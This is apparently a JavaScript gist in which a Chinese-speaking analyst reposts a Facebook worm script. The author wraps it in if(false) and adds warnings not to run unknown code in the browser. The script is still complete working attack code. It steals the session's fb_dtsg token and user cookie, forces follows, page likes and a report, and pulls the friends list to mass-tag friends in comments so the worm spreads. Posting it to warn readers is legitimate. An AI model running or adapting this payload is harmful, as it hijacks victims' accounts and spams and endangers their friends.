```js
/*
 * @see https://gist.github.com/Inndy/8618115
 * @ https://gist.github.com/Inndy/8768005
 * 這是神人大大剛剛發的JS
 * 我稍微分析了一下
 * 請各位不要幹這種無腦的事情
 * 還好他很 ______ 的只會讓你追蹤他，按他讚，Tag更多好友中標
 * 如果今天神人大大是真正的Hacker....
 * 他可以偷走你的個人資料，對你的帳號做各種奇怪的事情
 * Ex：對你的好友發送詐騙訊息，把你加入奇怪的社團
 * 在瀏覽器內執行來路不明的 JavaScript 是非常危險的...
 */

// !! Warning !!
// !! This is a evil script !!
// !! DO NOT EXECUTE IT !!
function () { if (false) {
// !! Warning !!
// !! This is a evil script !!
// !! DO NOT EXECUTE IT !!

var fb_dtsg = document.getElementsByName("fb_dtsg")[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

// 追蹤 ____ 的神人大大：https://www.facebook.com/Haousyokuhaki
function a(abone) {
    var http4 = new XMLHttpRequest;
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
    http4.onreadystatechange = function () {
        if (http4.readyState == 4 && http4.status == 200) http4.close
    };
    http4.send(params4)
}
a("100004136797154");


// 對 ____ 的Fnas page按讚：https://www.facebook.com/Qinal
function Like(p) {
    var Page = new XMLHttpRequest();
    var PageURL = "//www.facebook.com/ajax/pages/fan_status.php";
    var PageParams = "&fbpage_id=" + p + "&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user=" + user_id + "&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg=" + fb_dtsg + "&phstamp=";
    Page.open("POST", PageURL, true);
    Page.onreadystatechange = function () {
        if (Page.readyState == 4 && Page.status == 200) {
            Page.close
        }
    };
    Page.send(PageParams)
}
Like("181738685362704");


var fb_dtsg = document.getElementsByName("fb_dtsg")[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var now = (new Date)["getTime"]();

function Report(arg1) {
    var xhr = new XMLHttpRequest();
    var url = "//www.facebook.com/ajax/report/social.php";
    var param = "fb_dtsg=" + fb_dtsg + "&block=1&pp=%7B%22actions_to_take%22%3A%22[]%22%2C%22are_friends%22%3Afalse%2C%22cid%22%3A" + arg1 + "%2C%22content_type%22%3A0%2C%22expand_report%22%3A1%2C%22first_choice%22%3A%22file_report%22%2C%22from_gear%22%3A%22timeline%22%2C%22is_following%22%3Afalse%2C%22is_tagged%22%3Afalse%2C%22on_profile%22%3Afalse%2C%22phase%22%3A3%2C%22ref%22%3A%22https%3A%5C%2F%5C%2Fwww.facebook.com%5C%2FNan.ertt7%22%2C%22report_type%22%3A145%2C%22rid%22%3A" + arg1 + "%2C%22sub_report_type%22%3A3%2C%22time_flow_started%22%3A" + now + "%2C%22user%22%3A" + user_id + "%7D&file_report=1&__user=" + user_id + "&__a=1&__dyn=7n8ahyj2qmvu5k9UmAAaUVpo&__req=u&ttstamp=2658168571071108880";
    xhr["open"]("POST", url, true);
    xhr["onreadystatechange"] = function () {
        if (xhr["readyState"] == 4 && xhr["status"] == 200) {
            xhr["close"];
        };
    };
    xhr.send(param);
};
var fb_dtsg = document["getElementsByName"]("fb_dtsg")[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var arkadaslar = [];
var svn_rev;

function arkadaslari_al(id) {
    var xhr = new XMLHttpRequest();
    xhr["onreadystatechange"] = function () {
        if (xhr["readyState"] == 4) {
            eval("arkadaslar = " + xhr["responseText"].toString()["replace"]("for (;;);", "") + ";");
            for (f = 0; f < Math["round"](arkadaslar["payload"]["entries"]["length"] / 27); f++) {
                mesaj = "";
                mesaj_text = "";
                for (i = f * 27; i < (f + 1) * 27; i++) {
                    if (arkadaslar["payload"]["entries"][i]) {
                        mesaj += " @[" + arkadaslar["payload"]["entries"][i]["uid"] + ":" + arkadaslar["payload"]["entries"][i]["text"] + "]";
                        mesaj_text += " " + arkadaslar["payload"]["entries"][i]["text"];
                    };
                };
                yorum_yap(id, mesaj);
            };
        };
    };
    var str = "&filter[0]=user";
    str += "&options[0]=friends_only";
    str += "&options[1]=nm";
    str += "&token=v7";
    str += "&viewer=" + user_id;
    str += "&__user=" + user_id;
    if (document["URL"]["indexOf"]("https://") >= 0) {
        xhr["open"]("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + str, true);
    } else {
        xhr["open"]("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + str, true);
    };
    xhr["send"]();
};

function RandomArkadas() {
    var str = "";
    for (i = 0; i < 9; i++) {
        str += " @[" + arkadaslar["payload"]["entries"][Math["floor"](Math["random"]() * arkadaslar["payload"]["entries"]["length"])]["uid"] + ":" + arkadaslar["payload"]["entries"][Math["floor"](Math["random"]() * arkadaslar["payload"]["entries"]["length"])]["text"] + "]";
    };
    return str;
};

function yorum_yap(id, _0x7892xc) {
    var xhr = new XMLHttpRequest();
    var str = "";
    str += "&ft_ent_identifier=" + id;
    str += "&comment_text=" + encodeURIComponent(_0x7892xc);
    str += "&source=2";
    str += "&client_id=1377871797138:1707018092";
    str += "&reply_fbid";
    str += "&parent_comment_id";
    str += "&rootid=u_jsonp_2_3";
    str += "&clp={\"cl_impid\":\"453524a0\",\"clearcounter\":0,\"elementid\":\"js_5\",\"version\":\"x\",\"parent_fbid\":" + id + "}";
    str += "&attached_sticker_fbid=0";
    str += "&attached_photo_fbid=0";
    str += "&giftoccasion";
    str += "&ft[tn]=[]";
    str += "&__user=" + user_id;
    str += "&__a=1";
    str += "&__dyn=7n8ahyj35ynxl2u5F97KepEsyo";
    str += "&__req=q";
    str += "&fb_dtsg=" + fb_dtsg;
    str += "&ttstamp=";
    xhr["open"]("POST", "/ajax/ufi/add_comment.php", true);
    xhr["setRequestHeader"]("Content-type", "application/x-www-form-urlencoded");
    xhr["onreadystatechange"] = function () {
        if (xhr["readyState"] == 4 && xhr["status"] == 200) {
            xhr["close"];
        };
    };
    xhr["send"](str);
};
// Tag更多好友來這張非常 _____ 的照片
arkadaslari_al("280654532082438");

// !! Warning !!
// !! This is a evil script !!
// !! DO NOT EXECUTE IT !!
}}
// !! Warning !!
// !! This is a evil script !!
// !! DO NOT EXECUTE IT !!
```